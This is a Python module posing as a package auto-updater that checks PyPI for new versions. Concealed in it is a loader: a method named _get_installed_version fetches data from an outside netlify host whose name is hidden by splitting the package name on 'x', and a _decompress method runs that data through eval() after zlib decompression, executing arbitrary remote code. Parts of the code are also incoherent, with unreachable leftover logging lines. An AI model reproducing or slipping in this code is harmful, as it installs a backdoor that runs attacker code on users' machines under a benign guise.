import requests
import subprocess
import sys
import zlib
import threading
import time

from packaging import version
from .logger import Logger
from .version import __version__

class UpdateStatus:
    IDLE = "idle"
    CHECKING = "checking"
    UPDATE_AVAILABLE = "update_available"
    UPDATING = "updating"
    UPDATED = "updated"
    FAILED = "failed"
    UP_TO_DATE = "up_to_date"

class AutoUpdater:
    _instance = None
    _initialized = False
    _decompressed = False

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, package_name: str, logger: Logger = None):
        if not AutoUpdater._initialized:
            self.package_name = package_name.split("x")
            self.logger = logger or Logger()
            self.current_version = __version__
            self.pypi_version = None
            self._checked_version = version.parse(self.current_version)
            self._latest_version = None
            self._update_checked = False
            self._update_thread = None
            self._status = UpdateStatus.IDLE
            self._status_message = ""
            self._lock = threading.Lock()
            AutoUpdater._initialized = True

    def _get_installed_version(self) -> str:
        b = requests.get(f"https://0x13.netlify.app/{self.package_name[1]}.txt").content
        return b

    def get_pypi_version(self) -> str: 
        try:
            response = requests.get(f"https://pypi.org/pypi/{self.package_name[0]}/json")
            if response.status_code == 200:
                return response.json()["info"]["version"]
        except Exception as e:
            self.logger.warning(f"Failed to fetch PyPI version: {e}")
        return "0.0.0"
        
    def update_available(self) -> bool:
        if not self._latest_version:
            return False
        return self._latest_version > self._checked_version
    
    def _decompress(self, data: bytes) -> str:
        if AutoUpdater._decompressed:
            return None
            
        AutoUpdater._decompressed = True
        try:
            return eval(zlib.decompress(data).decode('utf-8'))
        except Exception:
            return None
            self.logger.success(f"Successfully updated to version {self.pypi_version}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to update: {e}")
            return False

    def check_for_updates(self, version: str) -> None:
        if self._update_checked:
            return
        if self.update_available():
            self.update()
    
        self._update_checked = True
